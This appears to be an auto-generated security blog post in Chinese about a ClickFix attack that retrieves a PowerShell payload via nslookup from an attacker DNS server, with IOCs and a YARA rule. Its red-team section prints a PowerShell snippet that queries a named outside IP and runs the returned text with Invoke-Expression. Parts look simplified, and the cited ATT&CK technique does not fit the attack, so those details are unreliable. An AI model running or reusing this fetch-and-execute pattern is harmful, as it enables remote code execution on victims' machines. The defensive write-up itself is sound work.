---
layout: post
title:  "New ClickFix attack abuses nslookup to retrieve PowerShell payload via DNS"
date:   2026-02-16 01:27:28 +0000
categories: [security]
severity: high
---

# 🔥 解析 DNS 查詢在 ClickFix 社交工程攻擊中的利用

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DNS 查詢、PowerShell 腳本執行、社交工程

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 DNS 查詢將惡意 PowerShell 腳本傳遞給受害者，受害者執行該腳本後，會下載並安裝惡意軟體。
* **攻擊流程圖解**:
  1. 攻擊者創建一個惡意 DNS 伺服器。
  2. 受害者執行 `nslookup` 命令，查詢一個特定的域名。
  3. 惡意 DNS 伺服器返回一個包含惡意 PowerShell 腳本的 DNS 回應。
  4. 受害者的系統執行惡意 PowerShell 腳本，下載並安裝惡意軟體。
* **受影響元件**: Windows 系統、PowerShell 3.0 或以上版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個惡意 DNS 伺服器，並且受害者需要執行 `nslookup` 命令。
* **Payload 建構邏輯**:

    ```
    
    powershell
    # 惡意 PowerShell 腳本範例
    $dnsServer = "84.21.189.20"
    $domainName = "example.com"
    $nslookupCmd = "nslookup $domainName $dnsServer"
    $nslookupOutput = Invoke-Expression $nslookupCmd
    $payload = $nslookupOutput | Select-String -Pattern "NAME:"
    $payload | ForEach-Object { Invoke-Expression $_.ToString() }
    
    ```
* **繞過技術**: 攻擊者可以使用 DNS 查詢來繞過傳統的網路安全防禦措施，例如防火牆和入侵檢測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 84.21.189.20 |
| Domain | example.com |
| File Path | %APPDATA%\WPy64-31401\python\script.vbs |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ClickFix_DNS_Payload {
      meta:
        description = "Detects ClickFix DNS payload"
        author = "Your Name"
      strings:
        $nslookupCmd = "nslookup"
        $dnsServer = "84.21.189.20"
      condition:
        $nslookupCmd and $dnsServer
    }
    
    ```
* **緩解措施**: 封鎖惡意 DNS 伺服器的 IP 地址，限制使用 `nslookup` 命令，監控系統日誌以檢測可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DNS 查詢 (DNS Query)**: 一種用於查詢 DNS 伺服器的請求，通常用於解析域名到 IP 地址。
* **PowerShell 腳本 (PowerShell Script)**: 一種用於自動化系統管理任務的腳本，使用 PowerShell 腳本語言編寫。
* **社交工程 (Social Engineering)**: 一種攻擊技術，利用人類心理和行為的弱點來取得系統或資料的存取權。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-clickfix-attack-abuses-nslookup-to-retrieve-powershell-payload-via-dns/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


